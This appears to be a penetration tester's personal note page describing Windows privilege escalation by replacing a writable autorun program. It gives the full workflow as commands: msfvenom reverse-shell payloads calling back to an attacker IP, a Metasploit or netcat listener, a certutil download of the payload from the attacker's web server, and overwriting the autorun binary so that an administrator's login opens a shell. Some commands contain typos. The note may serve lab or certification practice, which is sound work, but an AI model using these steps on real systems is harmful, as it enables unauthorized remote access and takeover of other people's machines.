-- -
[[Dark Arts/Privesc/Windows/Enumeration/Autoruns|Enum]]
General workflow:
1. Identify autoruns
2. Identify if you have `write` privs on autorun
3. Identify if autorun is run on admin login
4. Generate payload
5. name it the same as autorun program
6. replace autorun with malware payload
7. setup listener
8. wait for admin to log in and trigger autorun
If you are on this page, you should have done steps 1-3.
#### Generate payload
Attack box: 
```bash
msfvenom -p windows/meterprter/reverse_tcp lhost=<attack ip> lport=<port> -f exe -o <autorun program name>.exe

msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.10.14 lport=9001 -f exe -o program.exe
msfvenom -p windows/x64/reverse_tcp lhost=10.10.10.14 lport=9001 -f exe -o program.exe
```
#### setup listener
```bash
# for meterpreter payload
msfconsole
use multi/handler
set lhost 10.10.10.14
set lport 9001
run

# for regular reverse shell
nc -nvlp 9001
```
#### replace autorun w/ malware
Also see [[Dark Arts/File Transfer/Windows|file transfer]]
```powershell
# attackbox, navigate to payload dir
# setup server
sudo python -m http.server 80

# you can then open IE on target, input your attack ip to connect to it, click on file, save as, then save to location of autorun file.

# otherwise:
certutil -urlcache http://<attack ip>/<filepath> <path to autorun file>
certuitil -urlcache http://10.10.10.14/program.exe "C:\Program Files\Autorun Program\program.exe"
```
Now just wait for admin/other user to log in and it should give you a shell. 